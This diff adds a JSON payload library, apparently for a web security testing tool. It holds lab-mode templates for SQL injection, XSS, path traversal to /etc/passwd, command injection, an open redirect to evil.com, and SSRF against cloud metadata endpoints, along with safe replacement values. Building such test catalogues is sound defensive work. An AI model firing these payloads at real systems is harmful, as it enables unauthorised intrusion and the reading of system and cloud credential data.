@@ -1,0 +1,205 @@
+{
+  "sql_injection": {
+    "basic": {
+      "template": "' OR '1'='1",
+      "mode": "lab",
+      "category": "sql_injection",
+      "description": "Basic SQL injection test - OR condition",
+      "parameters": ["value"],
+      "safe_replacement": "test_value",
+      "lab_examples": {
+        "mysql": "' OR '1'='1",
+        "mssql": "' OR '1'='1",
+        "postgres": "' OR '1'='1",
+        "oracle": "' OR '1'='1"
+      }
+    },
+    "union": {
+      "template": "' UNION SELECT NULL--",
+      "mode": "lab",
+      "category": "sql_injection",
+      "description": "UNION-based SQL injection test",
+      "parameters": ["value"],
+      "safe_replacement": "test_union",
+      "lab_examples": {
+        "mysql": "' UNION SELECT NULL--",
+        "mssql": "' UNION SELECT NULL--",
+        "postgres": "' UNION SELECT NULL--",
+        "oracle": "' UNION SELECT NULL FROM DUAL--"
+      }
+    },
+    "error_based": {
+      "template": "' AND (SELECT 1/0)--",
+      "mode": "lab",
+      "category": "sql_injection",
+      "description": "Error-based SQL injection test",
+      "parameters": ["value"],
+      "safe_replacement": "test_error",
+      "lab_examples": {
+        "mysql": "' AND (SELECT 1/0)--",
+        "mssql": "' AND (SELECT 1/0)--",
+        "postgres": "' AND (SELECT 1/0)--",
+        "oracle": "' AND (SELECT 1/0 FROM DUAL)--"
+      }
+    },
+    "time_based": {
+      "template": "'; SLEEP(5)--",
+      "mode": "lab",
+      "category": "sql_injection",
+      "description": "Time-based SQL injection test",
+      "parameters": ["value"],
+      "safe_replacement": "test_time",
+      "lab_examples": {
+        "mysql": "'; SLEEP(5)--",
+        "mssql": "'; WAITFOR DELAY '00:00:05'--",
+        "postgres": "'; SELECT pg_sleep(5)--",
+        "oracle": "'; DBMS_LOCK.SLEEP(5)--"
+      }
+    }
+  },
+  "xss": {
+    "basic": {
+      "template": "<script>alert('XSS')</script>",
+      "mode": "lab",
+      "category": "xss",
+      "description": "Basic XSS test with script tag",
+      "parameters": ["value"],
+      "safe_replacement": "test_script",
+      "lab_examples": {
+        "basic": "<script>alert('XSS')</script>",
+        "img": "<img src=x onerror=alert('XSS')>",
+        "svg": "<svg onload=alert('XSS')>",
+        "iframe": "<iframe src=javascript:alert('XSS')>"
+      }
+    },
+    "event_handlers": {
+      "template": "<img src=x onerror=alert('XSS')>",
+      "mode": "lab",
+      "category": "xss",
+      "description": "XSS test with event handlers",
+      "parameters": ["value"],
+      "safe_replacement": "test_event",
+      "lab_examples": {
+        "onerror": "<img src=x onerror=alert('XSS')>",
+        "onload": "<svg onload=alert('XSS')>",
+        "onclick": "<div onclick=alert('XSS')>click me</div>",
+        "onmouseover": "<div onmouseover=alert('XSS')>hover me</div>"
+      }
+    },
+    "javascript_protocol": {
+      "template": "javascript:alert('XSS')",
+      "mode": "lab",
+      "category": "xss",
+      "description": "XSS test with javascript protocol",
+      "parameters": ["value"],
+      "safe_replacement": "test_protocol",
+      "lab_examples": {
+        "basic": "javascript:alert('XSS')",
+        "encoded": "javascript:alert('XSS')",
+        "mixed": "javascript:alert('XSS')"
+      }
+    }
+  },
+  "lfi": {
+    "basic": {
+      "template": "../../../../etc/passwd",
+      "mode": "lab",
+      "category": "lfi",
+      "description": "Basic LFI test - Linux path traversal",
+      "parameters": ["file"],
+      "safe_replacement": "test_file",
+      "lab_examples": {
+        "linux": "../../../../etc/passwd",
+        "windows": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+        "php_filter": "php://filter/convert.base64-encode/resource=index.php"
+      }
+    },
+    "encoded": {
+      "template": "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+      "mode": "lab",
+      "category": "lfi",
+      "description": "URL-encoded LFI test",
+      "parameters": ["file"],
+      "safe_replacement": "test_encoded",
+      "lab_examples": {
+        "url_encoded": "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+        "double_encoded": "..%252F..%252F..%252F..%252Fetc%252Fpasswd"
+      }
+    }
+  },
+  "command_injection": {
+    "basic": {
+      "template": "; id",
+      "mode": "lab",
+      "category": "command_injection",
+      "description": "Basic command injection test",
+      "parameters": ["command"],
+      "safe_replacement": "test_command",
+      "lab_examples": {
+        "linux": "; id",
+        "windows": "& dir",
+        "pipe": "| whoami",
+        "background": "& ping -c 1 127.0.0.1"
+      }
+    },
+    "time_based": {
+      "template": "; ping -c 1 127.0.0.1",
+      "mode": "lab",
+      "category": "command_injection",
+      "description": "Time-based command injection test",
+      "parameters": ["command"],
+      "safe_replacement": "test_ping",
+      "lab_examples": {
+        "linux": "; ping -c 1 127.0.0.1",
+        "windows": "& ping -n 1 127.0.0.1",
+        "curl": "; curl -s http://127.0.0.1:80"
+      }
+    }
+  },
+  "open_redirect": {
+    "basic": {
+      "template": "https://evil.com",
+      "mode": "lab",
+      "category": "open_redirect",
+      "description": "Basic open redirect test",
+      "parameters": ["redirect", "url", "return", "next"],
+      "safe_replacement": "https://example.com",
+      "lab_examples": {
+        "basic": "https://evil.com",
+        "encoded": "https%3A%2F%2Fevil.com",
+        "double_encoded": "https%253A%252F%252Fevil.com"
+      }
+    }
+  },
+  "ssrf": {
+    "basic": {
+      "template": "http://127.0.0.1:80",
+      "mode": "lab",
+      "category": "ssrf",
+      "description": "Basic SSRF test - localhost",
+      "parameters": ["url", "image", "src", "href"],
+      "safe_replacement": "https://example.com",
+      "lab_examples": {
+        "localhost": "http://127.0.0.1:80",
+        "internal": "http://10.0.0.1:80",
+        "cloud_metadata": "http://169.254.169.254/latest/meta-data/"
+      }
+    }
+  },
+  "safe_boundary_test": {
+    "template": "{{value}}BOUNDARY_TEST",
+    "mode": "safe",
+    "category": "boundary",
+    "description": "Safe boundary testing for input validation",
+    "parameters": ["value"],
+    "safe_replacement": "SAFE_BOUNDARY_TEST"
+  },
+  "safe_length_test": {
+    "template": "{{value}}{{padding}}",
+    "mode": "safe", 
+    "category": "length",
+    "description": "Safe length testing for input validation",
+    "parameters": ["value", "padding"],
+    "safe_replacement": "SAFE_LENGTH_TEST_PADDING"
+  }
+} 
